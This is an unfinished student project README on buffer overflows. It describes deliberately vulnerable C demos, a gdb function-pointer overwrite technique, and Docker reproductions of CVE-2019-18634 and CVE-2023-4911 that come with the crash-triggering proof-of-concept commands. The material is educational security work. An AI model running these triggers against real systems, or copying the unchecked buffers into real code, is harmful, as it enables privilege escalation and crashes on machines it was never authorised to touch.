[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/am3xLbu5)

# PROJECT NAME HERE (CHANGE THIS!!!!!)

### Buff Guys

Elias Xu, Jakob Weir, Julien Diamond

### Video Link:
https://drive.google.com/file/d/16Ehy6xjaqWnT9RKWWJ_A0T3JmKKmbP7R/view?usp=sharing

### Project Description:

This project aims to give a brief description of the cybersecurity concept of buffer overflows and show some demos, along with real life exploits.

Since C is the programming language that is easiest to show / understand memory overwrites and buffer overflows, we'd be using that for the project. However, we'd be using tryhackme attackboxes and dockerfiles to replicate the exact environment that is needed to run the exploit.

### Instructions:

There are multiple different different programs that are in this.

`working_demo.c`

`working_demo.c` is a proof of concept (POC) of the concept of buffer overflows. It's a simply strcopy that doesn't check for size, which can overflow the buffer.

To run, use these following commands:

```sh
# run whatever you want, you can overflow the buffer if you enter more than ~5 characters
make working_demo ARGS=aaaaaaaa
```

`changing_variable.c`

`changing_variable.c` demonstrates how buffer overflow can change / overwrite a variable name. When one overflows the buffer, the following variable's value will be overwritten, which is detected by the program and printed to output. 

To run, use these following commands:

```sh
# this will hopefully overwrite the buffer, changing the variable
make variable_change
> msksmadsmfnadsf
```

`function_pointing.c`

`function_pointing.c` demonstrates the use of gdb and how one can overwrite functions to perform actions that are not intended by the writers of the program (in this case, of course, it's fully intended, but let's ignore that). By default, the normal function will run, but through overwriting of variables the special or the other function can be run.

There are two functions that can be substituted into the program, one which uses simple piping while the other one uses more complex payloads. 

To run, use/execute these following commands:

```sh
make function_pointing
gdb functions
# inside gdb find the function pointers either for the special function or the other function
# then you could either do a run <<< python -c "print('A' * 13 [enough to overflow] + pointer code)"
# or first write that into a payload and then insert it into the run function
```

`demo2-4.c`

@julien

`pwfeedback`

`pwfeedback` recreates the CVE-2019-18634 vulnerability, where when enabling the pwfeedback option for sudo (which makes * when you enter your password can lead to buffer overflows). The container cannot spawn a root shell, but the POC of the vulnerability does exist. 

To run the docker container and see the POC:

```sh
make deploy_pwfeedback
# inside the container run the show the seg fault
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | ./sudo -S id
```

`loony`

`loony` recreates the CVE-2023-4911 vulnerability, also called Looney Tunables, which exploits a coding issue in glibc to cause some shenanagins. Just as in pwfeedback, the exploit code to get the root shell doesn't work here, but it does allow you to run the POC. However, tryhackme has a working attackbox that allows you to run the exploit, which we'll demonstrate. 

to run the docker container and see the POC:

```sh
make deploy_loony
# inside the container run the show the seg fault
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```

### Resources/ References:

- https://en.wikipedia.org/wiki/NOP_slide
- https://nvd.nist.gov/vuln/detail/cve-2019-18634
- https://y3a.github.io/2021/03/03/sudo-cve-analysis/
- https://tryhackme.com/room/looneytunes
- https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so 
- https://www.picussecurity.com/resource/blog/cve-2023-4911-looney-tunables-local-privilege-escalation-vulnerability 
- https://tryhackme.com/room/bof1 
- https://l1ge.github.io/tryhackme_bof1/ 
- https://medium.com/@cyberlarry/walkthrough-tryhackme-buffer-overflows-task-7-overwriting-function-pointers-ac1336979261
- https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/ 
- https://stackoverflow.com/questions/4700998/explain-stack-overflow-and-heap-overflow-in-programming-with-example
- 